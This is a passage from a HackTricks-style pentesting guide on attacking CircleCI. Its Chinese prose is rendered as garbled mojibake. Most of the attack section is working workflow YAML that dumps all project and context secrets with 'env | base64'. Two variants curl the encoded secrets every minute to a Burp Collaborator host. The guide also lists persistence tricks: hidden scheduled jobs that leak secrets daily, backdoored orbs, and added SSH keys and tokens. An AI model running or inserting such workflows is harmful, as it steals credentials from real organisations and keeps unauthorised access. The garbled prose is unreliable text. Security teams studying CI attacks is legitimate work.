# CircleCIå®‰å…¨

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFç‰ˆæœ¬çš„HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) **å’Œ** [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

## åŸºæœ¬ä¿¡æ¯

[**CircleCI**](https://circleci.com/docs/2.0/about-circleci/)æ˜¯ä¸€ä¸ªæŒç»­é›†æˆå¹³å°ï¼Œæ‚¨å¯ä»¥åœ¨å…¶ä¸­å®šä¹‰æ¨¡æ¿ï¼ŒæŒ‡ç¤ºå®ƒå¯¹æŸäº›ä»£ç æ‰§è¡Œä½•ç§æ“ä½œä»¥åŠä½•æ—¶æ‰§è¡Œã€‚è¿™æ ·ï¼Œæ‚¨å¯ä»¥ç›´æ¥ä»æ‚¨çš„å­˜å‚¨åº“ä¸»åˆ†æ”¯è‡ªåŠ¨åŒ–æµ‹è¯•æˆ–éƒ¨ç½²ã€‚

## æƒé™

**CircleCI** **ç»§æ‰¿äº†ä¸ç™»å½•è´¦æˆ·ç›¸å…³çš„githubå’Œbitbucketæƒé™**ã€‚\
åœ¨æˆ‘çš„æµ‹è¯•ä¸­ï¼Œæˆ‘å‘ç°åªè¦æ‚¨åœ¨githubä¸Šå¯¹å­˜å‚¨åº“å…·æœ‰**å†™æƒé™**ï¼Œæ‚¨å°±å¯ä»¥åœ¨CircleCIä¸­**ç®¡ç†å…¶é¡¹ç›®è®¾ç½®**ï¼ˆè®¾ç½®æ–°çš„sshå¯†é’¥ï¼Œè·å–é¡¹ç›®apiå¯†é’¥ï¼Œåˆ›å»ºå…·æœ‰æ–°çš„CircleCIé…ç½®çš„æ–°åˆ†æ”¯...ï¼‰ã€‚

ä½†æ˜¯ï¼Œæ‚¨éœ€è¦æ˜¯**å­˜å‚¨åº“ç®¡ç†å‘˜**æ‰èƒ½å°†å­˜å‚¨åº“è½¬æ¢ä¸ºCircleCIé¡¹ç›®ã€‚

## ç¯å¢ƒå˜é‡å’Œå¯†é’¥

æ ¹æ®[**æ–‡æ¡£**](https://circleci.com/docs/2.0/env-vars/)ï¼Œæœ‰ä¸åŒçš„æ–¹æ³•å¯ä»¥åœ¨å·¥ä½œæµç¨‹ä¸­**åŠ è½½ç¯å¢ƒå˜é‡çš„å€¼**ã€‚

### å†…ç½®ç¯å¢ƒå˜é‡

ç”±CircleCIè¿è¡Œçš„æ¯ä¸ªå®¹å™¨éƒ½å°†å§‹ç»ˆå…·æœ‰[**æ–‡æ¡£ä¸­å®šä¹‰çš„ç‰¹å®šç¯å¢ƒå˜é‡**](https://circleci.com/docs/2.0/env-vars/#built-in-environment-variables)ï¼Œå¦‚`CIRCLE_PR_USERNAME`ï¼Œ`CIRCLE_PROJECT_REPONAME`æˆ–`CIRCLE_USERNAME`ã€‚

### æ˜æ–‡

æ‚¨å¯ä»¥åœ¨**å‘½ä»¤**ä¸­ä»¥æ˜æ–‡å£°æ˜å®ƒä»¬ï¼š
```yaml
- run:
name: "set and echo"
command: |
SECRET="A secret"
echo $SECRET
```
æ‚¨å¯ä»¥åœ¨**è¿è¡Œç¯å¢ƒ**ä¸­ä»¥æ˜æ–‡å½¢å¼å£°æ˜å®ƒä»¬ï¼š
```yaml
- run:
name: "set and echo"
command: echo $SECRET
environment:
SECRET: A secret
```
æ‚¨å¯ä»¥åœ¨**build-jobç¯å¢ƒ**ä¸­ä»¥æ˜æ–‡å½¢å¼å£°æ˜å®ƒä»¬ï¼š
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
æ‚¨å¯ä»¥åœ¨**å®¹å™¨ç¯å¢ƒçš„ç¯å¢ƒå˜é‡**ä¸­æ˜æ–‡å£°æ˜å®ƒä»¬ï¼š
```yaml
jobs:
build-job:
docker:
- image: cimg/base:2020.01
environment:
SECRET: A secret
```
### é¡¹ç›®å¯†é’¥

è¿™äº›æ˜¯åªèƒ½ç”±é¡¹ç›®ï¼ˆä»»ä½•åˆ†æ”¯ï¼‰è®¿é—®çš„**å¯†é’¥**ã€‚\
æ‚¨å¯ä»¥åœ¨_https://app.circleci.com/settings/project/github/\<org\_name>/\<repo\_name>/environment-variables_ä¸­æŸ¥çœ‹å®ƒä»¬çš„å£°æ˜ã€‚

![](<../.gitbook/assets/image (50).png>)

{% hint style="danger" %}
"**å¯¼å…¥å˜é‡**"åŠŸèƒ½å…è®¸ä»å…¶ä»–é¡¹ç›®å¯¼å…¥å˜é‡åˆ°æ­¤é¡¹ç›®ä¸­ã€‚
{% endhint %}

### ä¸Šä¸‹æ–‡å¯†é’¥

è¿™äº›æ˜¯**ç»„ç»‡èŒƒå›´çš„**å¯†é’¥ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä»»ä½•å­˜å‚¨åœ¨æ­¤å¤„çš„ä»“åº“éƒ½å¯ä»¥è®¿é—®ä»»ä½•å¯†é’¥ï¼š

![](<../.gitbook/assets/image (80).png>)

{% hint style="success" %}
ä½†æ˜¯ï¼Œè¯·æ³¨æ„ï¼Œå¯ä»¥é€‰æ‹©ä¸åŒçš„ç»„ï¼ˆè€Œä¸æ˜¯æ‰€æœ‰æˆå‘˜ï¼‰æ¥ä»…å°†å¯†é’¥æˆæƒç»™ç‰¹å®šäººå‘˜ã€‚\
è¿™æ˜¯ç›®å‰æé«˜å¯†é’¥å®‰å…¨æ€§çš„æœ€ä½³æ–¹æ³•ä¹‹ä¸€ï¼Œä¸å…è®¸æ¯ä¸ªäººéƒ½è®¿é—®å¯†é’¥ï¼Œè€Œåªå…è®¸æŸäº›äººè®¿é—®ã€‚
{% endhint %}

## æ”»å‡»

### æœç´¢æ˜æ–‡å¯†é’¥

å¦‚æœæ‚¨å¯ä»¥è®¿é—®VCSï¼ˆå¦‚githubï¼‰ï¼Œè¯·æ£€æŸ¥æ¯ä¸ªä»“åº“çš„æ¯ä¸ªåˆ†æ”¯çš„`.circleci/config.yml`æ–‡ä»¶ï¼Œå¹¶æœç´¢å…¶ä¸­å­˜å‚¨çš„æ½œåœ¨æ˜æ–‡å¯†é’¥ã€‚

### å¯†é’¥ç¯å¢ƒå˜é‡å’Œä¸Šä¸‹æ–‡æšä¸¾

é€šè¿‡æ£€æŸ¥ä»£ç ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°åœ¨æ¯ä¸ª`.circleci/config.yml`æ–‡ä»¶ä¸­ä½¿ç”¨çš„**æ‰€æœ‰å¯†é’¥åç§°**ã€‚æ‚¨è¿˜å¯ä»¥ä»è¿™äº›æ–‡ä»¶ä¸­è·å–ä¸Šä¸‹æ–‡åç§°ï¼Œæˆ–åœ¨Webæ§åˆ¶å°ä¸­æ£€æŸ¥å®ƒä»¬ï¼š_https://app.circleci.com/settings/organization/github/\<org\_name>/contexts_ã€‚

### æ³„éœ²é¡¹ç›®å¯†é’¥

{% hint style="warning" %}
ä¸ºäº†**æ³„éœ²**æ‰€æœ‰é¡¹ç›®å’Œä¸Šä¸‹æ–‡**å¯†é’¥**ï¼Œæ‚¨åªéœ€è¦å¯¹æ•´ä¸ªgithubç»„ç»‡ä¸­çš„**1ä¸ªä»“åº“**å…·æœ‰**å†™å…¥**è®¿é—®æƒé™ï¼ˆ_é»˜è®¤æƒ…å†µä¸‹ï¼Œæ‚¨çš„å¸æˆ·å¯ä»¥è®¿é—®æ‰€æœ‰ä¸Šä¸‹æ–‡_ï¼‰ã€‚
{% endhint %}

{% hint style="danger" %}
"**å¯¼å…¥å˜é‡**"åŠŸèƒ½å…è®¸ä»å…¶ä»–é¡¹ç›®å¯¼å…¥å˜é‡åˆ°æ­¤é¡¹ç›®ä¸­ã€‚å› æ­¤ï¼Œæ”»å‡»è€…å¯ä»¥**å¯¼å…¥æ‰€æœ‰ä»“åº“çš„é¡¹ç›®å˜é‡**ï¼Œç„¶å**ä¸€èµ·æ³„éœ²æ‰€æœ‰å˜é‡**ã€‚
{% endhint %}

æ‰€æœ‰é¡¹ç›®å¯†é’¥å§‹ç»ˆè®¾ç½®åœ¨ä½œä¸šçš„ç¯å¢ƒä¸­ï¼Œå› æ­¤åªéœ€è°ƒç”¨envå¹¶åœ¨base64ä¸­æ··æ·†å®ƒï¼Œå³å¯å°†å¯†é’¥æ³„éœ²åœ¨**å·¥ä½œæµç¨‹Webæ—¥å¿—æ§åˆ¶å°**ä¸­ï¼š
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env
```
å¦‚æœæ‚¨**æ— æ³•è®¿é—®Webæ§åˆ¶å°**ï¼Œä½†å¯ä»¥**è®¿é—®å­˜å‚¨åº“**å¹¶ä¸”çŸ¥é“æ­£åœ¨ä½¿ç”¨CircleCIï¼Œæ‚¨å¯ä»¥**åˆ›å»ºä¸€ä¸ªå·¥ä½œæµ**ï¼Œè¯¥å·¥ä½œæµ**æ¯åˆ†é’Ÿè§¦å‘ä¸€æ¬¡**å¹¶å°†**æœºå¯†ä¿¡æ¯ä¼ è¾“åˆ°å¤–éƒ¨åœ°å€**ï¼š
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env
```
### æ³„éœ²ä¸Šä¸‹æ–‡ä¸­çš„ç§˜å¯†

æ‚¨éœ€è¦**æŒ‡å®šä¸Šä¸‹æ–‡åç§°**ï¼ˆè¿™ä¹Ÿå°†æ³„éœ²é¡¹ç›®çš„ç§˜å¯†ï¼‰ï¼š
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "env | base64"

workflows:
exfil-env-workflow:
jobs:
- exfil-env:
context: Test-Context
```
å¦‚æœæ‚¨**æ— æ³•è®¿é—®Webæ§åˆ¶å°**ï¼Œä½†å¯ä»¥**è®¿é—®å­˜å‚¨åº“**å¹¶ä¸”çŸ¥é“æ­£åœ¨ä½¿ç”¨CircleCIï¼Œæ‚¨å¯ä»¥**ä¿®æ”¹ä¸€ä¸ªæ¯åˆ†é’Ÿè§¦å‘çš„å·¥ä½œæµ**ï¼Œå°†æœºå¯†ä¿¡æ¯**ä¼ è¾“åˆ°å¤–éƒ¨åœ°å€**ï¼š
```yaml
version: 2.1

jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- run:
name: "Exfil env"
command: "curl https://lyn7hzchao276nyvooiekpjn9ef43t.burpcollaborator.net/?a=`env | base64 -w0`"

# I filter by the repo branch where this config.yaml file is located: circleci-project-setup
workflows:
exfil-env-workflow:
triggers:
- schedule:
cron: "* * * * *"
filters:
branches:
only:
- circleci-project-setup
jobs:
- exfil-env:
context: Test-Context
```
{% hint style="warning" %}
ä»…ä»…åœ¨å­˜å‚¨åº“ä¸­åˆ›å»ºä¸€ä¸ª `.circleci/config.yml` æ–‡ä»¶**ä¸è¶³ä»¥è§¦å‘ CircleCI æ„å»º**ã€‚æ‚¨éœ€è¦åœ¨ CircleCI æ§åˆ¶å°ä¸­**å°†å…¶ä½œä¸ºé¡¹ç›®å¯ç”¨**ã€‚
{% endhint %}

### é€ƒé€¸åˆ°äº‘ç«¯

**CircleCI** æä¾›äº†åœ¨**ä»–ä»¬çš„æœºå™¨ä¸Šæˆ–æ‚¨è‡ªå·±çš„æœºå™¨ä¸Šè¿è¡Œæ„å»ºçš„é€‰é¡¹**ã€‚\
é»˜è®¤æƒ…å†µä¸‹ï¼Œä»–ä»¬çš„æœºå™¨ä½äº GCP ä¸­ï¼Œæœ€åˆæ‚¨å¯èƒ½æ— æ³•æ‰¾åˆ°ä»»ä½•ç›¸å…³ä¿¡æ¯ã€‚ç„¶è€Œï¼Œå¦‚æœå—å®³è€…åœ¨**ä»–ä»¬è‡ªå·±çš„æœºå™¨ä¸Šè¿è¡Œä»»åŠ¡ï¼ˆå¯èƒ½æ˜¯åœ¨äº‘ç¯å¢ƒä¸­ï¼‰**ï¼Œæ‚¨å¯èƒ½ä¼šæ‰¾åˆ°ä¸€ä¸ª**åŒ…å«æœ‰è¶£ä¿¡æ¯çš„äº‘å…ƒæ•°æ®ç«¯ç‚¹**ã€‚

è¯·æ³¨æ„ï¼Œåœ¨å‰é¢çš„ç¤ºä¾‹ä¸­ï¼Œæ‰€æœ‰å†…å®¹éƒ½æ˜¯åœ¨ä¸€ä¸ª Docker å®¹å™¨ä¸­å¯åŠ¨çš„ï¼Œä½†æ‚¨ä¹Ÿå¯ä»¥**è¦æ±‚å¯åŠ¨ä¸€ä¸ªè™šæ‹Ÿæœº**ï¼ˆå¯èƒ½å…·æœ‰ä¸åŒçš„äº‘æƒé™ï¼‰ï¼š
```yaml
jobs:
exfil-env:
#docker:
#  - image: cimg/base:stable
machine:
image: ubuntu-2004:current
```
ç”šè‡³æ˜¯ä¸€ä¸ªå…·æœ‰è®¿é—®è¿œç¨‹dockeræœåŠ¡çš„dockerå®¹å™¨ï¼š
```yaml
jobs:
exfil-env:
docker:
- image: cimg/base:stable
steps:
- checkout
- setup_remote_docker:
version: 19.03.13
```
### æŒä¹…æ€§

* å¯ä»¥åœ¨CircleCIä¸­**åˆ›å»ºç”¨æˆ·ä»¤ç‰Œ**ï¼Œä»¥ä½¿ç”¨ç”¨æˆ·çš„è®¿é—®æƒé™è®¿é—®APIç«¯ç‚¹ã€‚
* _https://app.circleci.com/settings/user/tokens_
* å¯ä»¥åˆ›å»º**é¡¹ç›®ä»¤ç‰Œ**ï¼Œä»¥ä½¿ç”¨ä»¤ç‰Œè¢«æˆäºˆçš„æƒé™è®¿é—®é¡¹ç›®ã€‚
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/api_
* å¯ä»¥å‘é¡¹ç›®ä¸­**æ·»åŠ SSHå¯†é’¥**ã€‚
* _https://app.circleci.com/settings/project/github/\<org>/\<repo>/ssh_
* å¯ä»¥åœ¨æ„å¤–é¡¹ç›®çš„éšè—åˆ†æ”¯ä¸­**åˆ›å»ºå®šæ—¶ä»»åŠ¡**ï¼Œæ¯å¤©æ³„éœ²æ‰€æœ‰**ä¸Šä¸‹æ–‡ç¯å¢ƒå˜é‡**ã€‚
* æˆ–è€…åœ¨åˆ†æ”¯ä¸­åˆ›å»º/ä¿®æ”¹å·²çŸ¥ä»»åŠ¡ï¼Œæ¯å¤©æ³„éœ²æ‰€æœ‰ä¸Šä¸‹æ–‡å’Œé¡¹ç›®çš„**ç§˜å¯†**ã€‚
* å¦‚æœæ‚¨æ˜¯GitHubæ‰€æœ‰è€…ï¼Œå¯ä»¥**å…è®¸æœªç»éªŒè¯çš„orbs**ï¼Œå¹¶åœ¨ä½œä¸šä¸­é…ç½®ä¸€ä¸ªä½œä¸º**åé—¨**ã€‚
* æ‚¨å¯ä»¥åœ¨æŸäº›ä»»åŠ¡ä¸­æ‰¾åˆ°**å‘½ä»¤æ³¨å…¥æ¼æ´**ï¼Œé€šè¿‡ä¿®æ”¹å…¶å€¼çš„**ç§˜å¯†**æ¥**æ³¨å…¥å‘½ä»¤**

<details>

<summary><strong>æ”¯æŒHackTrickså¹¶è·å¾—ç¦åˆ©ï¼</strong></summary>

* å¦‚æœæ‚¨å¸Œæœ›åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„å…¬å¸å¹¿å‘Šï¼Œæˆ–è€…å¦‚æœæ‚¨æƒ³è®¿é—®PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricksï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFT**](https://opensea.io/collection/the-peass-family)æ”¶è—å“
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘çš„ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**ã€‚**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) **githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
